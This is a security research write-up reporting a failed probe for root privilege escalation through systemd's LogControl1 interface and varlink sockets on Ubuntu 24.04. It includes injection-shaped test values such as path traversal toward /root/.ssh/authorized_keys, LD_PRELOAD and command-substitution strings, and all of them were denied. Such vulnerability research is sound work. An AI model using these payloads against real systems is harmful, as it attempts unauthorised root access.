# systemd LogControl1 and varlink gap probe: negative

Result: no validated normal-user to root LPE in the stock Ubuntu 24.04 Server
target through `org.freedesktop.LogControl1` or the default world-reachable
systemd varlink sockets.

Repro:

```sh
./pocs/systemd_logcontrol_varlink_gap_probe.sh ubuntu24-server-lpe-target
# writes logs/systemd-logcontrol-varlink-gap.out
```

## Target proof

```text
PRETTY_NAME="Ubuntu 24.04.4 LTS"
systemd 255 (255.4-1ubuntu8.15)
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)

dbus                 1.14.10-4ubuntu4.1
polkitd              124-2ubuntu1.24.04.3
systemd              255.4-1ubuntu8.15
systemd-resolved     255.4-1ubuntu8.15
systemd-timesyncd    255.4-1ubuntu8.15
systemd-oomd         not installed
```

Service state:

```text
systemd-logind.service     static, active/running, root, BusName=org.freedesktop.login1
systemd-resolved.service   enabled, active/running, User=systemd-resolve, BusName=org.freedesktop.resolve1
systemd-timesyncd.service  enabled, inactive/dead, ConditionResult=no in the container, BusName=org.freedesktop.timesync1
systemd-oomd.service       not-found/inactive
```

Default reachable sockets:

```text
srw-rw-rw- root:root                         /run/systemd/io.systemd.ManagedOOM
srw-rw-rw- root:root                         /run/systemd/userdb/io.systemd.DynamicUser
srw-rw-rw- systemd-resolve:systemd-resolve   /run/systemd/resolve/io.systemd.Resolve
srw------- systemd-resolve:systemd-resolve   /run/systemd/resolve/io.systemd.Resolve.Monitor
srw------- root:root                         /run/systemd/io.systemd.sysext
```

## LogControl1

`/org/freedesktop/LogControl1` was present and readable on active systemd,
logind, and resolved:

```text
org.freedesktop.systemd1: LogLevel="info", LogTarget="journal", SyslogIdentifier="systemd"
org.freedesktop.login1:   LogLevel="info", LogTarget="auto",    SyslogIdentifier="systemd-logind"
org.freedesktop.resolve1: LogLevel="info", LogTarget="auto",    SyslogIdentifier="systemd-resolved"
```

As `attacker`, reads succeeded but all writes were denied before any
`LogLevel`/`LogTarget` value was applied. This included valid values and
control/path/env/command-shaped payloads:

```text
VALUE=debug
Failed to set property LogLevel on interface org.freedesktop.LogControl1: Access denied
set_loglevel_rc=1
Failed to set property LogTarget on interface org.freedesktop.LogControl1: Access denied
set_logtarget_rc=1

VALUE=file:/tmp/systemd_logcontrol_varlink_gap_lpe
Failed to set property LogLevel on interface org.freedesktop.LogControl1: Access denied
Failed to set property LogTarget on interface org.freedesktop.LogControl1: Access denied

VALUE=$'debug\n../../../root/.ssh/authorized_keys'
Failed to set property LogLevel on interface org.freedesktop.LogControl1: Access denied
Failed to set property LogTarget on interface org.freedesktop.LogControl1: Access denied

VALUE=LD_PRELOAD=/tmp/systemd_logcontrol_varlink_gap.so
Failed to set property LogLevel on interface org.freedesktop.LogControl1: Access denied
Failed to set property LogTarget on interface org.freedesktop.LogControl1: Access denied

VALUE=\$\(id\>/root/systemd_logcontrol_varlink_gap_lpe\)
Failed to set property LogLevel on interface org.freedesktop.LogControl1: Access denied
Failed to set property LogTarget on interface org.freedesktop.LogControl1: Access denied
```

`org.freedesktop.timesync1` was only activatable. In this container the service
does not start because `systemd-timesyncd.service` has an unmet container
condition; LogControl1 reads timed out or returned activation timeout, and
attacker writes still returned `Access denied`.

Final property checks stayed unchanged:

```text
systemd1: LogLevel="info", LogTarget="journal"
login1:   LogLevel="info", LogTarget="auto"
resolve1: LogLevel="info", LogTarget="auto"
```

## Varlink

The world-reachable varlink sockets exposed these method shapes to `attacker`:

```text
/run/systemd/io.systemd.ManagedOOM:
  io.systemd.ManagedOOM.SubscribeManagedOOMCGroups()
  io.systemd.UserDatabase.GetUserRecord/GetGroupRecord/GetMemberships

/run/systemd/userdb/io.systemd.DynamicUser:
  io.systemd.UserDatabase.GetUserRecord/GetGroupRecord/GetMemberships

/run/systemd/resolve/io.systemd.Resolve:
  io.systemd.Resolve.ResolveHostname(ifindex, name, family, flags)
  io.systemd.Resolve.ResolveAddress(ifindex, family, address, flags)
```

Private/non-world sockets stayed blocked:

```text
/run/systemd/resolve/io.systemd.Resolve.Monitor: Permission denied
/run/systemd/io.systemd.sysext: Permission denied
```

Exploit-shaped varlink calls did not produce root write/exec/confusion:

```text
managedoom normal subscribe:
recv=b'{"error":"org.varlink.service.PermissionDenied","parameters":{}}\x00'

managedoom path/env/state confusion:
recv=b'{"error":"org.varlink.service.InvalidParameter","parameters":{"parameter":"path"}}\x00'

dynamic-user root lookup:
recv=b'{"error":"io.systemd.UserDatabase.NoRecordFound","parameters":{}}\x00'

dynamic-user username control/path:
recv=b'{"error":"org.varlink.service.InvalidParameter","parameters":{"parameter":"userName"}}\x00'

dynamic-user service confusion:
recv=b'{"error":"io.systemd.UserDatabase.BadService","parameters":{}}\x00'

resolved normal hostname:
recv=b'{"parameters":{"addresses":[{"ifindex":1,"family":2,"address":[127,0,0,1]}],"name":"localhost","flags":786945}}\x00'

resolved hostname control/path:
recv=b'{"error":"org.varlink.service.InvalidParameter","parameters":{"parameter":"name"}}\x00'
```

SCM_RIGHTS/fd injection was also tested against ManagedOOM, DynamicUser, and
Resolve. The fd was ignored or the same authorization/lookup response was
returned; the only fd artifact was an attacker-owned temp file:

```text
-rw------- attacker:attacker 17 /tmp/systemd_logcontrol_varlink_gap_fd_probe
```

## Root proof and cleanup

No root marker was created:

```text
stat: cannot statx '/root/systemd_logcontrol_varlink_gap_lpe': No such file or directory
stat: cannot statx '/tmp/systemd_logcontrol_varlink_gap_lpe': No such file or directory
NO_ROOT_PROOF
```

Service health remained stable:

```text
systemd-logind.service: active
systemd-resolved.service: active
systemd-timesyncd.service: inactive
systemd-oomd.service: inactive
0 loaded units listed in systemctl --failed
```

Cleanup performed by the PoC removed the attacker temp marker/fd probe:

```text
rm -f /tmp/systemd_logcontrol_varlink_gap_lpe /tmp/systemd_logcontrol_varlink_gap_fd_probe
```
